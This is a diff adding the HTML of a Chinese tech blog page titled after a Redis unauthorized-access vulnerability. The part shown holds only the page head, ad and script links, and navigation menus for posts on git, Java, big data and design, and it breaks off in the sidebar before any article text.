@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Redis未授权访问漏洞 | 匆匆趣玩</title>
+    <meta name="generator" content="VuePress 1.9.9">
+    <link rel="icon" href="favicon.svg">
+    <script async="true" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6542685716937885" crossorigin="anonymous"></script>
+    <meta name="description" content="分享各类资源、教程、黑科技软件、工具等等">
+    <meta name="baidu-site-verification" content="codeva-7KiW1mSNFG">
+    
+    <link rel="preload" href="/assets/css/0.styles.7e5dbb62.css" as="style"><link rel="preload" href="/assets/js/app.163c86d3.js" as="script"><link rel="preload" href="/assets/js/2.44dd0d1f.js" as="script"><link rel="preload" href="/assets/js/7.413f6afe.js" as="script"><link rel="prefetch" href="/assets/js/10.350d509d.js"><link rel="prefetch" href="/assets/js/100.d69470e2.js"><link rel="prefetch" href="/assets/js/101.e9802019.js"><link rel="prefetch" href="/assets/js/102.76da865a.js"><link rel="prefetch" href="/assets/js/103.ab03398e.js"><link rel="prefetch" href="/assets/js/104.4a687fdc.js"><link rel="prefetch" href="/assets/js/105.f2918a4b.js"><link rel="prefetch" href="/assets/js/106.b53c49e1.js"><link rel="prefetch" href="/assets/js/107.f061791b.js"><link rel="prefetch" href="/assets/js/108.7a25d388.js"><link rel="prefetch" href="/assets/js/109.080aad82.js"><link rel="prefetch" href="/assets/js/11.f07ab12f.js"><link rel="prefetch" href="/assets/js/110.9f39f5aa.js"><link rel="prefetch" href="/assets/js/111.c3082c8d.js"><link rel="prefetch" href="/assets/js/112.d6f707d3.js"><link rel="prefetch" href="/assets/js/113.e5ae9506.js"><link rel="prefetch" href="/assets/js/114.60ee28f8.js"><link rel="prefetch" href="/assets/js/115.66af819b.js"><link rel="prefetch" href="/assets/js/116.0426d1c8.js"><link rel="prefetch" href="/assets/js/117.2567585d.js"><link rel="prefetch" href="/assets/js/118.f8a6a6e1.js"><link rel="prefetch" href="/assets/js/119.bac2e585.js"><link rel="prefetch" href="/assets/js/12.4b788e43.js"><link rel="prefetch" href="/assets/js/120.bfe8f71d.js"><link rel="prefetch" href="/assets/js/121.73d35251.js"><link rel="prefetch" href="/assets/js/122.dbf3bd80.js"><link rel="prefetch" href="/assets/js/123.f843936f.js"><link rel="prefetch" href="/assets/js/124.3fd6eaf7.js"><link rel="prefetch" href="/assets/js/125.866b24ec.js"><link rel="prefetch" href="/assets/js/126.81c5bebd.js"><link rel="prefetch" href="/assets/js/127.a73c0b65.js"><link rel="prefetch" href="/assets/js/128.7ce95e69.js"><link rel="prefetch" href="/assets/js/129.0686221c.js"><link rel="prefetch" href="/assets/js/13.2b650a48.js"><link rel="prefetch" href="/assets/js/130.4f34f3a2.js"><link rel="prefetch" href="/assets/js/131.59d793a4.js"><link rel="prefetch" href="/assets/js/132.e6b13b6a.js"><link rel="prefetch" href="/assets/js/133.2b44d11b.js"><link rel="prefetch" href="/assets/js/134.482f5baa.js"><link rel="prefetch" href="/assets/js/135.a082823f.js"><link rel="prefetch" href="/assets/js/136.6a4c7449.js"><link rel="prefetch" href="/assets/js/137.db4d6517.js"><link rel="prefetch" href="/assets/js/138.4553e6d7.js"><link rel="prefetch" href="/assets/js/139.7b9b6415.js"><link rel="prefetch" href="/assets/js/14.aa79d381.js"><link rel="prefetch" href="/assets/js/140.39bf1de8.js"><link rel="prefetch" href="/assets/js/141.d080e2d1.js"><link rel="prefetch" href="/assets/js/142.40f6f381.js"><link rel="prefetch" href="/assets/js/143.8415bb1e.js"><link rel="prefetch" href="/assets/js/144.4d03860b.js"><link rel="prefetch" href="/assets/js/145.c6b06887.js"><link rel="prefetch" href="/assets/js/146.d8f73421.js"><link rel="prefetch" href="/assets/js/147.b76c2757.js"><link rel="prefetch" href="/assets/js/148.f3346478.js"><link rel="prefetch" href="/assets/js/149.ce50e132.js"><link rel="prefetch" href="/assets/js/15.e1722178.js"><link rel="prefetch" href="/assets/js/150.c6f19237.js"><link rel="prefetch" href="/assets/js/151.28c734df.js"><link rel="prefetch" href="/assets/js/152.5123da4e.js"><link rel="prefetch" href="/assets/js/153.f472e4e3.js"><link rel="prefetch" href="/assets/js/154.5932726d.js"><link rel="prefetch" href="/assets/js/155.2ce8bafb.js"><link rel="prefetch" href="/assets/js/156.38b67fd9.js"><link rel="prefetch" href="/assets/js/157.9a343e2a.js"><link rel="prefetch" href="/assets/js/158.0569f75c.js"><link rel="prefetch" href="/assets/js/159.44417abe.js"><link rel="prefetch" href="/assets/js/16.71ae6ba9.js"><link rel="prefetch" href="/assets/js/160.5d74da87.js"><link rel="prefetch" href="/assets/js/161.288aaf85.js"><link rel="prefetch" href="/assets/js/162.7bb424bb.js"><link rel="prefetch" href="/assets/js/163.0ba203ea.js"><link rel="prefetch" href="/assets/js/164.df0118a2.js"><link rel="prefetch" href="/assets/js/165.daab884d.js"><link rel="prefetch" href="/assets/js/166.bca5d8dc.js"><link rel="prefetch" href="/assets/js/167.1447a283.js"><link rel="prefetch" href="/assets/js/168.dc63bdae.js"><link rel="prefetch" href="/assets/js/169.6b4d7533.js"><link rel="prefetch" href="/assets/js/17.f26ae8ee.js"><link rel="prefetch" href="/assets/js/170.f44c0dea.js"><link rel="prefetch" href="/assets/js/171.432a4a65.js"><link rel="prefetch" href="/assets/js/172.7248476c.js"><link rel="prefetch" href="/assets/js/173.5122f318.js"><link rel="prefetch" href="/assets/js/174.e2116e5d.js"><link rel="prefetch" href="/assets/js/175.1e4363b1.js"><link rel="prefetch" href="/assets/js/176.32fa4650.js"><link rel="prefetch" href="/assets/js/177.a12fae33.js"><link rel="prefetch" href="/assets/js/178.6bb783b2.js"><link rel="prefetch" href="/assets/js/179.a31fb87c.js"><link rel="prefetch" href="/assets/js/18.48bc5187.js"><link rel="prefetch" href="/assets/js/180.300dcad1.js"><link rel="prefetch" href="/assets/js/181.8456aee1.js"><link rel="prefetch" href="/assets/js/182.78624e3d.js"><link rel="prefetch" href="/assets/js/183.eb3ac769.js"><link rel="prefetch" href="/assets/js/184.d1ffb2e0.js"><link rel="prefetch" href="/assets/js/185.f07747ee.js"><link rel="prefetch" href="/assets/js/186.feb15b26.js"><link rel="prefetch" href="/assets/js/187.5736f785.js"><link rel="prefetch" href="/assets/js/188.152c051d.js"><link rel="prefetch" href="/assets/js/189.bf87a366.js"><link rel="prefetch" href="/assets/js/19.5a3bbc8a.js"><link rel="prefetch" href="/assets/js/190.6c243a57.js"><link rel="prefetch" href="/assets/js/191.81d8ba24.js"><link rel="prefetch" href="/assets/js/192.ade191b3.js"><link rel="prefetch" href="/assets/js/193.9aa706b3.js"><link rel="prefetch" href="/assets/js/194.ab0f0747.js"><link rel="prefetch" href="/assets/js/195.6a7d2a70.js"><link rel="prefetch" href="/assets/js/196.d83f71c0.js"><link rel="prefetch" href="/assets/js/197.6365005f.js"><link rel="prefetch" href="/assets/js/20.6a743204.js"><link rel="prefetch" href="/assets/js/21.3e4dd1e1.js"><link rel="prefetch" href="/assets/js/22.1b309238.js"><link rel="prefetch" href="/assets/js/23.7f2c3fe0.js"><link rel="prefetch" href="/assets/js/24.f28cc789.js"><link rel="prefetch" href="/assets/js/25.b0f36166.js"><link rel="prefetch" href="/assets/js/26.b1b2e7b8.js"><link rel="prefetch" href="/assets/js/27.e3cc715f.js"><link rel="prefetch" href="/assets/js/28.82fcefaa.js"><link rel="prefetch" href="/assets/js/29.e72e93d1.js"><link rel="prefetch" href="/assets/js/3.e1a7a7e8.js"><link rel="prefetch" href="/assets/js/30.584b02d5.js"><link rel="prefetch" href="/assets/js/31.c30a5ceb.js"><link rel="prefetch" href="/assets/js/32.63f076eb.js"><link rel="prefetch" href="/assets/js/33.da0c11ae.js"><link rel="prefetch" href="/assets/js/34.0398fe51.js"><link rel="prefetch" href="/assets/js/35.c58c79c1.js"><link rel="prefetch" href="/assets/js/36.56e740af.js"><link rel="prefetch" href="/assets/js/37.c855c722.js"><link rel="prefetch" href="/assets/js/38.0c942c67.js"><link rel="prefetch" href="/assets/js/39.bb00cf97.js"><link rel="prefetch" href="/assets/js/4.965afd88.js"><link rel="prefetch" href="/assets/js/40.5e993b43.js"><link rel="prefetch" href="/assets/js/41.cf4e8bb1.js"><link rel="prefetch" href="/assets/js/42.b23ae5d2.js"><link rel="prefetch" href="/assets/js/43.7465a853.js"><link rel="prefetch" href="/assets/js/44.abea671f.js"><link rel="prefetch" href="/assets/js/45.b83b83eb.js"><link rel="prefetch" href="/assets/js/46.6e4bb569.js"><link rel="prefetch" href="/assets/js/47.97909bce.js"><link rel="prefetch" href="/assets/js/48.5d12d331.js"><link rel="prefetch" href="/assets/js/49.40aad425.js"><link rel="prefetch" href="/assets/js/5.6b16e5cb.js"><link rel="prefetch" href="/assets/js/50.9f2e990d.js"><link rel="prefetch" href="/assets/js/51.e6ee81db.js"><link rel="prefetch" href="/assets/js/52.2a3fbaf4.js"><link rel="prefetch" href="/assets/js/53.46d0c9ce.js"><link rel="prefetch" href="/assets/js/54.a8a7d9a5.js"><link rel="prefetch" href="/assets/js/55.0c1c52ae.js"><link rel="prefetch" href="/assets/js/56.3d64732d.js"><link rel="prefetch" href="/assets/js/57.43947f07.js"><link rel="prefetch" href="/assets/js/58.77aa07aa.js"><link rel="prefetch" href="/assets/js/59.4fe91968.js"><link rel="prefetch" href="/assets/js/6.e15e8cc6.js"><link rel="prefetch" href="/assets/js/60.9e4ac151.js"><link rel="prefetch" href="/assets/js/61.006ee003.js"><link rel="prefetch" href="/assets/js/62.ef7d9187.js"><link rel="prefetch" href="/assets/js/63.03c8a2c6.js"><link rel="prefetch" href="/assets/js/64.bab1b9aa.js"><link rel="prefetch" href="/assets/js/65.e6ad1158.js"><link rel="prefetch" href="/assets/js/66.3ee0a4a7.js"><link rel="prefetch" href="/assets/js/67.c6c8643a.js"><link rel="prefetch" href="/assets/js/68.e230dc99.js"><link rel="prefetch" href="/assets/js/69.41ca4675.js"><link rel="prefetch" href="/assets/js/70.2da7fd92.js"><link rel="prefetch" href="/assets/js/71.20ddb858.js"><link rel="prefetch" href="/assets/js/72.a9d5a7b4.js"><link rel="prefetch" href="/assets/js/73.b894e79b.js"><link rel="prefetch" href="/assets/js/74.73a699fa.js"><link rel="prefetch" href="/assets/js/75.6b0e53ad.js"><link rel="prefetch" href="/assets/js/76.81682299.js"><link rel="prefetch" href="/assets/js/77.80cc916b.js"><link rel="prefetch" href="/assets/js/78.cdb58a71.js"><link rel="prefetch" href="/assets/js/79.d2d6976f.js"><link rel="prefetch" href="/assets/js/8.c788aed2.js"><link rel="prefetch" href="/assets/js/80.a68c23f6.js"><link rel="prefetch" href="/assets/js/81.3cc8a4f9.js"><link rel="prefetch" href="/assets/js/82.0f507120.js"><link rel="prefetch" href="/assets/js/83.444707a5.js"><link rel="prefetch" href="/assets/js/84.4620f3d9.js"><link rel="prefetch" href="/assets/js/85.580492c3.js"><link rel="prefetch" href="/assets/js/86.a1daa976.js"><link rel="prefetch" href="/assets/js/87.731188da.js"><link rel="prefetch" href="/assets/js/88.510b3e85.js"><link rel="prefetch" href="/assets/js/89.64eea88e.js"><link rel="prefetch" href="/assets/js/9.3c401208.js"><link rel="prefetch" href="/assets/js/90.a6d64438.js"><link rel="prefetch" href="/assets/js/91.42319d72.js"><link rel="prefetch" href="/assets/js/92.b5c4243a.js"><link rel="prefetch" href="/assets/js/93.72f3dd3b.js"><link rel="prefetch" href="/assets/js/94.e113e608.js"><link rel="prefetch" href="/assets/js/95.496d2cbe.js"><link rel="prefetch" href="/assets/js/96.7a7200c8.js"><link rel="prefetch" href="/assets/js/97.3291eea9.js"><link rel="prefetch" href="/assets/js/98.bb7766ca.js"><link rel="prefetch" href="/assets/js/99.483fa72f.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.7e5dbb62.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="https://blog-1320192491.cos.ap-nanjing.myqcloud.com/logo.png" alt="匆匆趣玩" class="logo"> <span class="site-name can-hide">匆匆趣玩</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
+  首页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="图南的博客" class="dropdown-title"><span class="title">图南的博客</span> <span class="arrow down"></span></button> <button type="button" aria-label="图南的博客" class="mobile-dropdown-title"><span class="title">图南的博客</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://ground-gun.gitee.io/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Blog-first
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://gitee.com/ground-gun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Gitee
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://github.com/triggergun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.zhihu.com/people/hong-lang-80-78/posts" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  知乎
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="/git/git.html" class="nav-link">
+  git
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="运维" class="dropdown-title"><span class="title">运维</span> <span class="arrow down"></span></button> <button type="button" aria-label="运维" class="mobile-dropdown-title"><span class="title">运维</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/运维/windows/cmd.html" class="nav-link">
+  命令
+</a></li><li class="dropdown-item"><!----> <a href="/network/network01.html" class="nav-link">
+  网络
+</a></li><li class="dropdown-item"><h4>
+          https原理实战
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/network/https/深入浅出https原理/02密码学.html" class="nav-link">
+  02)密码学
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="java" class="dropdown-title"><span class="title">java</span> <span class="arrow down"></span></button> <button type="button" aria-label="java" class="mobile-dropdown-title"><span class="title">java</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/java/javaSEBase/java.html" class="nav-link">
+  java基础
+</a></li><li class="dropdown-item"><!----> <a href="/java/gradle/01安装gradle.html" class="nav-link">
+  gradle
+</a></li><li class="dropdown-item"><h4>
+          dao层框架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/Mybatis/mybatis.html" class="nav-link">
+  mybatis
+</a></li><li class="dropdown-subitem"><a href="/java/mybatis_plus/03多数据库源的编写.html" class="nav-link">
+  mybatis-plus
+</a></li></ul></li><li class="dropdown-item"><h4>
+          源码分析区
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/spring源码分析/01Spring源码下载.html" class="nav-link">
+  spring源码分析
+</a></li></ul></li><li class="dropdown-item"><h4>
+          springCloud
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/springcloudgateway/01gateway.html" class="nav-link">
+  gateway
+</a></li></ul></li><li class="dropdown-item"><!----> <a href="/java/designModel/AssemblerDesignPattern.html" class="nav-link">
+  设计模式
+</a></li><li class="dropdown-item"><!----> <a href="/java/java工具/xpath解析doc.html" class="nav-link">
+  java工具
+</a></li><li class="dropdown-item"><!----> <a href="/java/java基础服务/nexus/01nexus3的docker安装.html" class="nav-link">
+  java基础服务
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="lyp" class="dropdown-title"><span class="title">lyp</span> <span class="arrow down"></span></button> <button type="button" aria-label="lyp" class="mobile-dropdown-title"><span class="title">lyp</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          javascript
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/javascript/01什么是事件.html" class="nav-link">
+  基础概念
+</a></li></ul></li><li class="dropdown-item"><h4>
+          微信小程序
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/小程序/微信小程序/01什么是小程序.html" class="nav-link">
+  微信小程序
+</a></li></ul></li><li class="dropdown-item"><h4>
+          c语言
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/c语言/安装devc++.html" class="nav-link">
+  c语言
+</a></li></ul></li><li class="dropdown-item"><h4>
+          C++
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/C++语言/01我的第一个C++程序/01如何创建工程.html" class="nav-link">
+  C++
+</a></li></ul></li><li class="dropdown-item"><h4>
+          db
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/db/mysql/mysql数据库总结/01添加唯一索引程序在添加数据.html" class="nav-link">
+  mysql实验总结
+</a></li></ul></li><li class="dropdown-item"><h4>
+          rust语言
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/rust语言/第一阶段基础篇/01rust是什么.html" class="nav-link">
+  第一阶段基础
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="大数据" class="dropdown-title"><span class="title">大数据</span> <span class="arrow down"></span></button> <button type="button" aria-label="大数据" class="mobile-dropdown-title"><span class="title">大数据</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          hadoop基础理论
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/hadoop基本概念/阶段一/01MapReduce是什么.html" class="nav-link">
+  MapReduce理论
+</a></li></ul></li><li class="dropdown-item"><h4>
+          spark
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/02spark/01Spark集群安装与部署.html" class="nav-link">
+  spark集群
+</a></li><li class="dropdown-subitem"><a href="/lyp/大数据/scala语言基础/01scala简介.html" class="nav-link">
+  scala语言基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          zookeepre
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/zookeeper/01Zookeeper分布式集群部署.html" class="nav-link">
+  zookeepre集群
+</a></li></ul></li><li class="dropdown-item"><h4>
+          kafka
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/kafka/01Kafka集群部署与测试.html" class="nav-link">
+  kafka集群
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="美工" class="dropdown-title"><span class="title">美工</span> <span class="arrow down"></span></button> <button type="button" aria-label="美工" class="mobile-dropdown-title"><span class="title">美工</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          ps
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/ps/01ps基础/01巧记ps快捷键.html" class="nav-link">
+  pa基础
+</a></li></ul></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
+  首页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="图南的博客" class="dropdown-title"><span class="title">图南的博客</span> <span class="arrow down"></span></button> <button type="button" aria-label="图南的博客" class="mobile-dropdown-title"><span class="title">图南的博客</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://ground-gun.gitee.io/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Blog-first
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://gitee.com/ground-gun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Gitee
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://github.com/triggergun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.zhihu.com/people/hong-lang-80-78/posts" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  知乎
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="/git/git.html" class="nav-link">
+  git
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="运维" class="dropdown-title"><span class="title">运维</span> <span class="arrow down"></span></button> <button type="button" aria-label="运维" class="mobile-dropdown-title"><span class="title">运维</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/运维/windows/cmd.html" class="nav-link">
+  命令
+</a></li><li class="dropdown-item"><!----> <a href="/network/network01.html" class="nav-link">
+  网络
+</a></li><li class="dropdown-item"><h4>
+          https原理实战
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/network/https/深入浅出https原理/02密码学.html" class="nav-link">
+  02)密码学
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="java" class="dropdown-title"><span class="title">java</span> <span class="arrow down"></span></button> <button type="button" aria-label="java" class="mobile-dropdown-title"><span class="title">java</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/java/javaSEBase/java.html" class="nav-link">
+  java基础
+</a></li><li class="dropdown-item"><!----> <a href="/java/gradle/01安装gradle.html" class="nav-link">
+  gradle
+</a></li><li class="dropdown-item"><h4>
+          dao层框架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/Mybatis/mybatis.html" class="nav-link">
+  mybatis
+</a></li><li class="dropdown-subitem"><a href="/java/mybatis_plus/03多数据库源的编写.html" class="nav-link">
+  mybatis-plus
+</a></li></ul></li><li class="dropdown-item"><h4>
+          源码分析区
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/spring源码分析/01Spring源码下载.html" class="nav-link">
+  spring源码分析
+</a></li></ul></li><li class="dropdown-item"><h4>
+          springCloud
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/springcloudgateway/01gateway.html" class="nav-link">
+  gateway
+</a></li></ul></li><li class="dropdown-item"><!----> <a href="/java/designModel/AssemblerDesignPattern.html" class="nav-link">
+  设计模式
+</a></li><li class="dropdown-item"><!----> <a href="/java/java工具/xpath解析doc.html" class="nav-link">
+  java工具
+</a></li><li class="dropdown-item"><!----> <a href="/java/java基础服务/nexus/01nexus3的docker安装.html" class="nav-link">
+  java基础服务
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="lyp" class="dropdown-title"><span class="title">lyp</span> <span class="arrow down"></span></button> <button type="button" aria-label="lyp" class="mobile-dropdown-title"><span class="title">lyp</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          javascript
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/javascript/01什么是事件.html" class="nav-link">
+  基础概念
+</a></li></ul></li><li class="dropdown-item"><h4>
+          微信小程序
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/小程序/微信小程序/01什么是小程序.html" class="nav-link">
+  微信小程序
+</a></li></ul></li><li class="dropdown-item"><h4>
+          c语言
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/c语言/安装devc++.html" class="nav-link">
+  c语言
+</a></li></ul></li><li class="dropdown-item"><h4>
+          C++
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/C++语言/01我的第一个C++程序/01如何创建工程.html" class="nav-link">
+  C++
+</a></li></ul></li><li class="dropdown-item"><h4>
+          db
